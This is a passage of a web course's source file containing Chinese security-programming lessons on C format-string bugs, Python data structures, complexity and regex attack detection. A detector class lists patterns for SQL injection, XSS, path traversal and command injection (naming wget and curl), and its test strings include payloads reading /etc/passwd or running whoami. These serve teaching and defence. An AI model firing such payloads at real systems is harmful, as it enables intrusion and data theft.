\"%x %x %x\" → 泄露栈上的值\r\n    // 输入 \"%p %p %p\" → 泄露指针（地址信息）\r\n    // 输入 \"%n\"       → 写入任意内存！\r\n}\r\n\r\nvoid safe_log(char *input) {\r\n    // ✅ 永远用 \"%s\"\r\n    printf(\"%s\", input);\r\n}\r\n\r\nint main() {\r\n    // 演示信息泄露\r\n    printf(\"正常输出: \");\r\n    safe_log(\"Hello %x %x\");  // 输出: Hello %x %x\r\n    printf(\"\\n\");\r\n\r\n    printf(\"危险输出: \");\r\n    // vulnerable_log(\"Stack values: %x %x %x %x\");\r\n    // 会打印栈上的实际值！\r\n    printf(\"(已注释，取消注释可看到效果)\\n\");\r\n\r\n    return 0;\r\n}</code></pre></div>\r\n\r\n<h3>漏洞防御速查表</h3>\r\n\r\n<table>\r\n<thead><tr><th>漏洞类型</th><th>危险函数</th><th>安全替代</th><th>编译选项</th></tr></thead>\r\n<tbody>\r\n<tr><td>栈溢出</td><td><code>strcpy</code>, <code>gets</code>, <code>sprintf</code></td><td><code>strncpy</code>, <code>fgets</code>, <code>snprintf</code></td><td><code>-fstack-protector-all</code></td></tr>\r\n<tr><td>堆溢出</td><td>不检查长度的写入</td><td>始终用 <code>sizeof</code> 限制</td><td><code>-fsanitize=address</code></td></tr>\r\n<tr><td>UAF</td><td>free 后不置空</td><td>free 后立即 <code>= NULL</code></td><td><code>-fsanitize=address</code></td></tr>\r\n<tr><td>格式化字符串</td><td><code>printf(user_input)</code></td><td><code>printf(\"%s\", user_input)</code></td><td><code>-Wformat-security</code></td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>用 <code>gcc -fsanitize=address -g</code> 编译上面的漏洞代码，运行后观察 AddressSanitizer 如何检测并报告内存错误。这是安全审计的利器。</p>\r\n</div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(4)\">▶ 打开编程练习：C 指针</button>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>栈溢出</strong>：覆盖返回地址 = 代码执行</li>\r\n<li><strong>堆溢出</strong>：覆盖相邻对象或堆管理结构</li>\r\n<li><strong>UAF</strong>：释放后使用 → 被攻击者劫持</li>\r\n<li><strong>格式化字符串</strong>：泄露/写入任意内存</li>\r\n<li>防御：<code>strncpy</code> 替代 <code>strcpy</code>，释放后置 NULL，<code>printf(\"%s\", x)</code></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-05"] = "<!-- ============================================================= -->\r\n\r\n<h2>常用数据结构速通</h2>\r\n<h3>prog-05 · 数据结构与算法 · 安全工具的数据骨架</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>C 语言内存漏洞</strong>。现在回到 Python，换一个维度思考：你的安全工具处理的数据越来越多——上千个 IP、数万条日志、百万级规则匹配。用什么数据结构来组织这些数据，直接决定了工具的<strong>效率</strong>。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你的端口扫描器要升级：支持百万级 IP 的批量扫描、快速查重（避免重复扫描）、按风险评分排序输出结果。导师说：\"选对数据结构，性能能提升 100 倍。\"</p>\r\n</div>\r\n\r\n<h3>列表（List）：顺序存储</h3>\r\n\r\n<p>列表是最基础的数据结构。在安全工具中用于存储扫描队列、日志行、端口列表等。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 扫描队列\r\nscan_queue = [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.3\"]\r\nscan_queue.append(\"10.0.0.4\")       # O(1) 添加\r\nscan_queue.insert(0, \"10.0.0.0\")    # O(n) 插入\r\n\r\n# 列表推导式 —— 快速过滤\r\nopen_ports = [80, 443, 22, 3306, 21, 23]\r\nweb_ports = [p for p in open_ports if p in (80, 443, 8080, 8443)]\r\n\r\n# 切片 —— 批量处理\r\nbatch_size = 100\r\nfor i in range(0, len(scan_queue), batch_size):\r\n    batch = scan_queue[i:i+batch_size]\r\n    print(f\"处理批次 {i//batch_size + 1}: {len(batch)} 个目标\")</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>列表的 <code>append</code> 是 O(1)，但 <code>insert(0, x)</code> 是 O(n)——需要移动所有元素。如果你经常在头部操作，考虑用 <code>collections.deque</code>。</p>\r\n</div>\r\n\r\n<h3>字典（Dict）：哈希映射</h3>\r\n\r\n<p>字典是安全工具中使用频率最高的数据结构。查找速度 O(1)，适合做 IP 去重、端口映射、漏洞数据库查询。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># IP 去重和计数\r\nip_counter = {}\r\nlog_ips = [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.1\", \"10.0.0.3\", \"10.0.0.1\"]\r\n\r\nfor ip in log_ips:\r\n    ip_counter[ip] = ip_counter.get(ip, 0) + 1\r\n\r\nprint(ip_counter)  # {'10.0.0.1': 3, '10.0.0.2': 1, '10.0.0.3': 1}\r\n\r\n# 漏洞数据库\r\nvuln_db = {\r\n    \"CVE-2021-44228\": {\"name\": \"Log4Shell\", \"cvss\": 10.0},\r\n    \"CVE-2021-34527\": {\"name\": \"PrintNightmare\", \"cvss\": 8.8},\r\n    \"CVE-2023-44487\": {\"name\": \"HTTP/2 Rapid Reset\", \"cvss\": 7.5},\r\n}\r\n\r\n# O(1) 查找\r\ncve = \"CVE-2021-44228\"\r\nif cve in vuln_db:\r\n    print(f\"{cve}: {vuln_db[cve]['name']} (CVSS {vuln_db[cve]['cvss']})\")\r\n\r\n# 按 CVSS 排序\r\nsorted_vulns = sorted(vuln_db.items(), key=lambda x: x[1][\"cvss\"], reverse=True)\r\nfor cve_id, info in sorted_vulns:\r\n    print(f\"  {cve_id}: {info['cvss']}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>集合（Set）：快速去重与交集</h3>\r\n\r\n<p>集合在安全场景中特别有用——IP 去重、端口对比、权限交集。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># IP 去重\r\nseen_ips = set()\r\nraw_ips = [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.1\", \"10.0.0.3\"]\r\nfor ip in raw_ips:\r\n    seen_ips.add(ip)\r\nprint(f\"唯一 IP 数: {len(seen_ips)}\")  # 3\r\n\r\n# 集合运算 —— 安全分析利器\r\nscan1_ports = {22, 80, 443, 3306, 8080}   # 第一次扫描\r\nscan2_ports = {22, 80, 443, 5432, 9090}   # 第二次扫描\r\n\r\nnew_ports = scan2_ports - scan1_ports      # 新增的端口\r\nprint(f\"新增端口: {new_ports}\")             # {5432, 9090}\r\n\r\nclosed_ports = scan1_ports - scan2_ports    # 关闭的端口\r\nprint(f\"关闭端口: {closed_ports}\")          # {3306, 8080}\r\n\r\ncommon_ports = scan1_ports & scan2_ports    # 两次都开放\r\nprint(f\"持续开放: {common_ports}\")          # {22, 80, 443}\r\n\r\n# 权限检查\r\nuser_perms = {\"read\", \"write\", \"execute\"}\r\nrequired = {\"read\", \"admin\"}\r\nmissing = required - user_perms\r\nif missing:\r\n    print(f\"缺少权限: {missing}\")</code></pre></div>\r\n\r\n<h3>队列与栈：deque</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from collections import deque\r\n\r\n# 队列（FIFO）—— BFS 扫描\r\nscan_queue = deque()\r\nscan_queue.append(\"10.0.0.1\")\r\nscan_queue.append(\"10.0.0.2\")\r\ntarget = scan_queue.popleft()  # O(1) 取出第一个\r\n\r\n# 栈（LIFO）—— DFS 遍历\r\nstack = deque()\r\nstack.append(\"/var/www\")\r\nstack.append(\"/var/www/html\")\r\npath = stack.pop()  # O(1) 取出最后一个\r\n\r\n# 限制大小的队列 —— 滑动窗口日志监控\r\nfrom collections import deque\r\nrecent_logs = deque(maxlen=100)  # 只保留最近 100 条\r\nfor i in range(200):\r\n    recent_logs.append(f\"Log entry {i}\")\r\nprint(f\"窗口大小: {len(recent_logs)}\")  # 100\r\nprint(f\"最新: {recent_logs[-1]}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>排序与搜索</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import bisect\r\n\r\n# 排序扫描结果\r\nresults = [\r\n    {\"ip\": \"10.0.0.3\", \"risk\": 8.5},\r\n    {\"ip\": \"10.0.0.1\", \"risk\": 3.2},\r\n    {\"ip\": \"10.0.0.2\", \"risk\": 9.1},\r\n    {\"ip\": \"10.0.0.4\", \"risk\": 5.0},\r\n]\r\n\r\n# 按风险评分排序\r\nby_risk = sorted(results, key=lambda x: x[\"risk\"], reverse=True)\r\nfor r in by_risk:\r\n    print(f\"  {r['ip']}: 风险 {r['risk']}\")\r\n\r\n# 二分查找 —— 在排序的 CVE 列表中快速定位\r\ncve_list = sorted([\"CVE-2021-44228\", \"CVE-2023-44487\",\r\n                   \"CVE-2021-34527\", \"CVE-2024-3094\"])\r\nidx = bisect.bisect_left(cve_list, \"CVE-2023-44487\")\r\nif idx < len(cve_list) and cve_list[idx] == \"CVE-2023-44487\":\r\n    print(f\"找到 CVE 在位置 {idx}\")</code></pre></div>\r\n\r\n<h3>实战：IP 扫描管理器</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"IP 扫描管理器 — 综合运用多种数据结构\"\"\"\r\n\r\nclass IPScanManager:\r\n    def __init__(self):\r\n        self.scanned = set()            # 已扫描 IP（去重）\r\n        self.queue = deque()            # 待扫描队列\r\n        self.results = {}               # 扫描结果\r\n        self.risk_scores = []           # 风险评分列表\r\n\r\n    def add_targets(self, ips):\r\n        \"\"\"添加目标（自动去重）\"\"\"\r\n        for ip in ips:\r\n            if ip not in self.scanned:\r\n                self.queue.append(ip)\r\n\r\n    def get_next_batch(self, size=100):\r\n        \"\"\"获取下一批待扫描 IP\"\"\"\r\n        batch = []\r\n        while self.queue and len(batch) < size:\r\n            ip = self.queue.popleft()\r\n            if ip not in self.scanned:\r\n                batch.append(ip)\r\n                self.scanned.add(ip)\r\n        return batch\r\n\r\n    def add_result(self, ip, open_ports, risk_score):\r\n        self.results[ip] = {\"ports\": open_ports, \"risk\": risk_score}\r\n        self.risk_scores.append((risk_score, ip))\r\n        self.risk_scores.sort(reverse=True)\r\n\r\n    def top_risky(self, n=10):\r\n        return self.risk_scores[:n]\r\n\r\n    def stats(self):\r\n        return {\r\n            \"scanned\": len(self.scanned),\r\n            \"pending\": len(self.queue),\r\n            \"results\": len(self.results),\r\n        }\r\n\r\nmgr = IPScanManager()\r\nmgr.add_targets([\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.1\", \"10.0.0.3\"])\r\nbatch = mgr.get_next_batch(10)\r\nprint(f\"批次: {batch}\")  # 去重后 3 个\r\nmgr.add_result(\"10.0.0.1\", [80, 443], 7.5)\r\nmgr.add_result(\"10.0.0.2\", [22], 3.0)\r\nprint(f\"Top 风险: {mgr.top_risky(5)}\")</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给 IPScanManager 添加一个功能：检测 IP 是否属于已知恶意 IP 列表（用集合实现 O(1) 查找）。提示：从文件加载恶意 IP 到 set。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>数据结构选择速查</h3>\r\n\r\n<table>\r\n<thead><tr><th>场景</th><th>推荐结构</th><th>原因</th></tr></thead>\r\n<tbody>\r\n<tr><td>扫描队列</td><td><code>deque</code></td><td>O(1) 两端操作</td></tr>\r\n<tr><td>IP 去重</td><td><code>set</code></td><td>O(1) 查找和插入</td></tr>\r\n<tr><td>端口→服务映射</td><td><code>dict</code></td><td>O(1) 键查找</td></tr>\r\n<tr><td>排序输出</td><td><code>sorted list</code></td><td>有序遍历</td></tr>\r\n<tr><td>频率统计</td><td><code>Counter</code></td><td>内置计数</td></tr>\r\n<tr><td>优先级队列</td><td><code>heapq</code></td><td>O(log n) 插入/弹出</td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<div class=\"checkpoint\" data-cp=\"3\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>列表</strong>：顺序存储，适合批量操作</li>\r\n<li><strong>字典</strong>：O(1) 查找，安全工具核心数据结构</li>\r\n<li><strong>集合</strong>：去重、交集/差集运算</li>\r\n<li><strong>deque</strong>：高效队列和栈</li>\r\n<li>选对数据结构 = 性能提升百倍</li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-05-02"] = "<!-- ============================================================= -->\r\n\r\n<h2>算法复杂度分析</h2>\r\n<h3>prog-05 · 数据结构与算法 · 为什么你的扫描器这么慢？</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>常用数据结构</strong>。但光有数据结构不够——<strong>怎么用</strong>这些数据同样关键。同样的 IP 列表，暴力逐个比较和用二分查找，性能差 1000 倍。本章我们学习算法复杂度分析，让你的安全工具又快又省。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你的扫描器要扫描一个 /16 子网（65536 个 IP），每个 IP 扫描 1000 个端口。你的脚本跑了 3 天还没完。导师说：\"分析一下时间复杂度，看看哪里能优化。\"</p>\r\n</div>\r\n\r\n<h3>Big O 表示法：衡量效率的尺子</h3>\r\n\r\n<p>Big O 不是精确的秒数，而是描述<strong>输入规模增长时，运行时间如何增长</strong>的趋势。</p>\r\n\r\n<table>\r\n<thead><tr><th>复杂度</th><th>名称</th><th>1万数据</th><th>10万数据</th><th>安全场景</th></tr></thead>\r\n<tbody>\r\n<tr><td>O(1)</td><td>常数</td><td>1 步</td><td>1 步</td><td>字典查找、集合查询</td></tr>\r\n<tr><td>O(log n)</td><td>对数</td><td>14 步</td><td>17 步</td><td>二分查找</td></tr>\r\n<tr><td>O(n)</td><td>线性</td><td>1万 步</td><td>10万 步</td><td>遍历列表</td></tr>\r\n<tr><td>O(n log n)</td><td>线性对数</td><td>13万 步</td><td>170万 步</td><td>排序</td></tr>\r\n<tr><td>O(n²)</td><td>平方</td><td>1亿 步</td><td>100亿 步</td><td>双重循环比对</td></tr>\r\n<tr><td>O(2ⁿ)</td><td>指数</td><td>不可能</td><td>不可能</td><td>暴力破解密码</td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<h3>安全工具中的复杂度对比</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import time\r\n\r\n# ===== 场景：检查 IP 是否在黑名单中 =====\r\nblacklist = [f\"10.0.{i//256}.{i%256}\" for i in range(10000)]\r\ntest_ips = [f\"10.0.{i//256}.{i%256}\" for i in range(0, 10000, 3)]\r\n\r\n# ❌ O(n*m) — 每次在列表中线性查找\r\ndef slow_check(target_ips, blacklist_list):\r\n    found = 0\r\n    for ip in target_ips:\r\n        if ip in blacklist_list:  # O(n) 列表查找\r\n            found += 1\r\n    return found\r\n\r\n# ✅ O(n+m) — 用集合\r\ndef fast_check(target_ips, blacklist_list):\r\n    bl_set = set(blacklist_list)  # O(m) 构建集合\r\n    found = 0\r\n    for ip in target_ips:\r\n        if ip in bl_set:          # O(1) 集合查找\r\n            found += 1\r\n    return found\r\n\r\n# 性能测试\r\nt0 = time.time()\r\nslow_check(test_ips, blacklist)\r\nprint(f\"慢版本 (列表): {time.time()-t0:.3f}s\")\r\n\r\nt0 = time.time()\r\nfast_check(test_ips, blacklist)\r\nprint(f\"快版本 (集合): {time.time()-t0:.3f}s\")\r\n# 快版本通常快 100-1000 倍！</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>排序算法与安全日志分析</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 场景：按风险评分排序漏洞报告\r\n\r\nvulnerabilities = [\r\n    {\"cve\": \"CVE-2021-44228\", \"cvss\": 10.0, \"name\": \"Log4Shell\"},\r\n    {\"cve\": \"CVE-2023-44487\", \"cvss\": 7.5, \"name\": \"HTTP/2 Rapid Reset\"},\r\n    {\"cve\": \"CVE-2021-34527\", \"cvss\": 8.8, \"name\": \"PrintNightmare\"},\r\n    {\"cve\": \"CVE-2024-3094\", \"cvss\": 10.0, \"name\": \"XZ Backdoor\"},\r\n    {\"cve\": \"CVE-2023-38408\", \"cvss\": 9.8, \"name\": \"OpenSSH RCE\"},\r\n]\r\n\r\n# Python 内置排序 — Timsort, O(n log n)\r\nby_cvss = sorted(vulnerabilities, key=lambda v: v[\"cvss\"], reverse=True)\r\nfor v in by_cvss:\r\n    print(f\"  {v['cvss']:4.1f}  {v['cve']}  {v['name']}\")\r\n\r\n# 如果需要频繁插入并保持有序 → bisect\r\nimport bisect\r\n\r\nsorted_scores = []\r\nfor v in vulnerabilities:\r\n    bisect.insort(sorted_scores, (-v[\"cvss\"], v[\"cve\"], v[\"name\"]))\r\n    # 负数实现降序\r\n\r\nfor score, cve, name in sorted_scores:\r\n    print(f\"  {-score:4.1f}  {cve}  {name}\")</code></pre></div>\r\n\r\n<h3>哈希与安全：为什么字典这么快？</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 字典和集合的底层是哈希表\r\n# 哈希函数把 key 映射到数组索引\r\n\r\n# 演示：字符串的哈希值\r\nprint(hash(\"192.168.1.1\"))   # 某个整数\r\nprint(hash(\"192.168.1.2\"))   # 完全不同的整数\r\n\r\n# 安全应用：快速去重 + 查找\r\n# 扫描 100 万个 IP，检查是否在恶意 IP 库中\r\n\r\n# ❌ 列表：O(n) 每次查找\r\nmalicious_list = [f\"evil-{i}.com\" for i in range(100000)]\r\n\r\n# ✅ 集合：O(1) 每次查找\r\nmalicious_set = set(malicious_list)\r\n\r\nimport time\r\ntest = \"evil-50000.com\"\r\n\r\nt0 = time.time()\r\n_ = test in malicious_list\r\nprint(f\"列表查找: {time.time()-t0:.6f}s\")\r\n\r\nt0 = time.time()\r\n_ = test in malicious_set\r\nprint(f\"集合查找: {time.time()-t0:.6f}s\")</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>哈希表的最坏情况是 O(n)（所有 key 哈希冲突），但在实践中几乎不会发生。Python 的 <code>hash()</code> 函数对字符串做了随机化种子，防止哈希碰撞攻击（HashDoS）。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>空间复杂度：内存也是资源</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import sys\r\n\r\n# 场景：存储 100 万个 IP 地址\r\nips = [f\"10.0.{i//256}.{i%256}\" for i in range(1000000)]\r\n\r\n# 列表存储\r\nlist_size = sys.getsizeof(ips) + sum(sys.getsizeof(ip) for ip in ips[:100]) * 10000\r\nprint(f\"列表内存: ~{list_size / 1024 / 1024:.0f} MB\")\r\n\r\n# 集合存储（更多内存，但查找更快）\r\nip_set = set(ips)\r\nset_size = sys.getsizeof(ip_set)\r\nprint(f\"集合内存: ~{set_size / 1024 / 1024:.0f} MB\")\r\n\r\n# 如果需要极致的空间效率 → 只存整数\r\n# 把 IP 转为 32 位整数：10.0.3.232 → 167772152\r\ndef ip_to_int(ip):\r\n    parts = ip.split(\".\")\r\n    return (int(parts[0]) << 24) + (int(parts[1]) << 16) + \\\r\n           (int(parts[2]) << 8) + int(parts[3])\r\n\r\ndef int_to_ip(n):\r\n    return f\"{(n>>24)&0xFF}.{(n>>16)&0xFF}.{(n>>8)&0xFF}.{n&0xFF}\"\r\n\r\nip_ints = set(ip_to_int(ip) for ip in ips)\r\nint_size = sys.getsizeof(ip_ints)\r\nprint(f\"整数集合: ~{int_size / 1024 / 1024:.0f} MB\")\r\n# 显著更省内存！</code></pre></div>\r\n\r\n<h3>优化你的安全工具：实用建议</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"性能优化速查\"\"\"\r\n\r\n# 1. 避免在循环中重复计算\r\n# ❌ 慢\r\nfor ip in targets:\r\n    for port in get_all_ports():    # 每次都调用函数\r\n        scan(ip, port)\r\n\r\n# ✅ 快\r\nports = get_all_ports()            # 提前计算\r\nfor ip in targets:\r\n    for port in ports:\r\n        scan(ip, port)\r\n\r\n# 2. 用生成器处理大文件（惰性求值）\r\ndef log_generator(filepath):\r\n    \"\"\"逐行读取，不加载整个文件到内存\"\"\"\r\n    with open(filepath) as f:\r\n        for line in f:\r\n            if \"ERROR\" in line or \"WARN\" in line:\r\n                yield line.strip()\r\n\r\n# 使用：内存恒定，不管文件多大\r\nfor entry in log_generator(\"huge_log.txt\"):\r\n    process(entry)\r\n\r\n# 3. 用 Counter 做频率统计\r\nfrom collections import Counter\r\nlog_ips = [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.1\", \"10.0.0.1\"]\r\ncounter = Counter(log_ips)\r\nprint(counter.most_common(3))  # [('10.0.0.1', 3), ('10.0.0.2', 1)]</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给你的端口扫描器添加性能分析：用 <code>time</code> 模块测量每个阶段的耗时，找出瓶颈。然后尝试用集合替代列表做 IP 去重，对比优化前后的时间差。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>Big O</strong> 衡量算法效率的增长趋势</li>\r\n<li>集合查找 O(1) vs 列表查找 O(n)——选错差 1000 倍</li>\r\n<li>排序是 O(n log n)，用 <code>sorted()</code> 就够了</li>\r\n<li><strong>空间复杂度</strong>也很重要——大文件用生成器</li>\r\n<li>优化三板斧：选对数据结构、避免重复计算、惰性求值</li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-06"] = "<!-- ============================================================= -->\r\n\r\n<h2>正则基础与安全应用</h2>\r\n<h3>prog-06 · 正则表达式 · 模式匹配的艺术</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>算法复杂度</strong>。现在我们进入一个安全工程师每天都用的强大工具——<strong>正则表达式</strong>。从日志分析到漏洞检测、从 WAF 规则到恶意代码识别，正则无处不在。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你的日志分析器已经能检测一些攻击模式了，但用的是简单的字符串包含检查。导师说：\"用正则表达式重写——要能匹配 SQL 注入的各种变形、识别 XSS 载荷、提取日志中的 IP 和时间戳。\"</p>\r\n</div>\r\n\r\n<h3>正则表达式基础</h3>\r\n\r\n<p>正则表达式是一种<strong>描述文本模式</strong>的语言。在安全领域，它用来\"从海量文本中精确找到你想要的东西\"。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import re\r\n\r\n# 基础匹配\r\ntext = \"SSH-2.0-OpenSSH_8.2p1 running on port 22\"\r\n\r\n# 简单查找\r\nmatch = re.search(r\"OpenSSH_(\\d+\\.\\d+\\w*)\", text)\r\nif match:\r\n    print(f\"版本: {match.group(1)}\")  # 8.2p1\r\n\r\n# 查找所有匹配\r\nlog = \"\"\"\r\n10.0.0.1 - - [01/Jan/2024:10:00:00] \"GET /index.html\" 200\r\n10.0.0.2 - - [01/Jan/2024:10:00:01] \"POST /login\" 401\r\n10.0.0.1 - - [01/Jan/2024:10:00:02] \"GET /admin\" 403\r\n\"\"\"\r\n\r\n# 提取所有 IP 地址\r\nips = re.findall(r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\", log)\r\nprint(f\"找到的 IP: {ips}\")\r\n\r\n# 提取 HTTP 状态码\r\ncodes = re.findall(r'\" (\\d{3})', log)\r\nprint(f\"状态码: {codes}\")</code></pre></div>\r\n\r\n<h3>常用正则语法速查</h3>\r\n\r\n<table>\r\n<thead><tr><th>语法</th><th>含义</th><th>安全示例</th></tr></thead>\r\n<tbody>\r\n<tr><td><code>.</code></td><td>任意字符</td><td>模糊匹配</td></tr>\r\n<tr><td><code>\\d</code> <code>\\w</code> <code>\\s</code></td><td>数字/字母数字/空白</td><td><code>\\d{1,3}</code> 匹配 IP 段</td></tr>\r\n<tr><td><code>*</code> <code>+</code> <code>?</code></td><td>0次+/1次+/0或1次</td><td><code>\\w+</code> 匹配单词</td></tr>\r\n<tr><td><code>{n,m}</code></td><td>n到m次</td><td><code>\\d{1,3}</code></td></tr>\r\n<tr><td><code>[]</code></td><td>字符集</td><td><code>[a-fA-F0-9]</code> 十六进制</td></tr>\r\n<tr><td><code>()</code></td><td>捕获组</td><td>提取匹配的子部分</td></tr>\r\n<tr><td><code>^</code> <code>$</code></td><td>开头/结尾</td><td><code>^SSH</code> 匹配 SSH Banner</td></tr>\r\n<tr><td><code>|</code></td><td>或</td><td><code>GET|POST|PUT</code></td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>安全应用：攻击模式检测</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"正则表达式安全检测器\"\"\"\r\nimport re\r\n\r\nclass AttackDetector:\r\n    def __init__(self):\r\n        # SQL 注入模式\r\n        self.sqli_patterns = [\r\n            re.compile(r\"('\\s*(OR|AND)\\s+['\\d])\", re.I),\r\n            re.compile(r\"(UNION\\s+(ALL\\s+)?SELECT)\", re.I),\r\n            re.compile(r\"(;\\s*(DROP|DELETE|INSERT|UPDATE)\\s)\", re.I),\r\n            re.compile(r\"(--|#|/\\*)\", re.I),\r\n            re.compile(r\"(information_schema|sys\\.databases)\", re.I),\r\n            re.compile(r\"(SLEEP\\s*\\(\\s*\\d+\\s*\\))\", re.I),\r\n        ]\r\n\r\n        # XSS 模式\r\n        self.xss_patterns = [\r\n            re.compile(r\"<\\s*script[^>]*>\", re.I),\r\n            re.compile(r\"javascript\\s*:\", re.I),\r\n            re.compile(r\"on(error|load|click|mouseover)\\s*=\", re.I),\r\n            re.compile(r\"<\\s*img[^>]+onerror\", re.I),\r\n            re.compile(r\"(alert|confirm|prompt)\\s*\\(\", re.I),\r\n        ]\r\n\r\n        # 目录遍历\r\n        self.traversal_patterns = [\r\n            re.compile(r\"(\\.\\.[/\\\\]){2,}\"),\r\n            re.compile(r\"(%2e%2e[/\\\\%])\", re.I),\r\n            re.compile(r\"(/etc/(passwd|shadow|hosts))\", re.I),\r\n            re.compile(r\"(c:\\\\windows\\\\system32)\", re.I),\r\n        ]\r\n\r\n        # 命令注入\r\n        self.cmdi_patterns = [\r\n            re.compile(r\"[;&|]\\s*(ls|cat|whoami|id|wget|curl)\\b\"),\r\n            re.compile(r\"\\$\\([^)]+\\)\"),\r\n            re.compile(r\"`[^`]+`\"),\r\n        ]\r\n\r\n    def check(self, text):\r\n        \"\"\"检测文本中的攻击模式\"\"\"\r\n        findings = []\r\n\r\n        for pattern in self.sqli_patterns:\r\n            m = pattern.search(text)\r\n            if m:\r\n                findings.append((\"SQL注入\", m.group()))\r\n\r\n        for pattern in self.xss_patterns:\r\n            m = pattern.search(text)\r\n            if m:\r\n                findings.append((\"XSS\", m.group()))\r\n\r\n        for pattern in self.traversal_patterns:\r\n            m = pattern.search(text)\r\n            if m:\r\n                findings.append((\"目录遍历\", m.group()))\r\n\r\n        for pattern in self.cmdi_patterns:\r\n            m = pattern.search(text)\r\n            if m:\r\n                findings.append((\"命令注入\", m.group()))\r\n\r\n        return findings\r\n\r\n# 测试\r\ndetector = AttackDetector()\r\n\r\ntest_cases = [\r\n    \"GET /search?q=test' OR '1'='1\",\r\n    \"GET /page?name=<script>alert(1)</script>\",\r\n    \"GET /file?path=../../../../etc/passwd\",\r\n    \"GET /api?cmd=; whoami\",\r\n    \"GET /normal/page?id=123\",\r\n]\r\n\r\nfor tc in test_cases:\r\n    results = detector.check(tc)\r\n    if results:\r\n        print(f\"🚨 {tc[:50]}...\")\r\n        for attack_type, matched in results:\r\n            print(f\"   → {attack_type}: '{matched}'\")\r\n    else:\r\n        print(f\"✅ {tc[:50]}...\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>日志解析：提取结构化数据</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"用正则解析 Apache/Nginx 访问日志\"\"\"\r\nimport re\r\nfrom datetime import datetime\r\n\r\n# Apache Combined Log Format 正则\r\nLOG_PATTERN = re.compile(\r\n    r'(?P<ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'  # IP\r\n    r'\\s+-\\s+-\\s+'\r\n    r'\\[(?P<time>[^\\]]+)\\]\\s+'                         # 时间\r\n    r'\"(?P<method>\\w+)\\s+(?P<path>\\S+)\\s+\\S+\"\\s+'     # 请求\r\n    r'(?P<status>\\d{3})\\s+'                            # 状态码\r\n    r'(?P<size>\\d+|-)'                                 # 大小\r\n)\r\n\r\nsample_logs = [\r\n    '10.0.0.1 - - 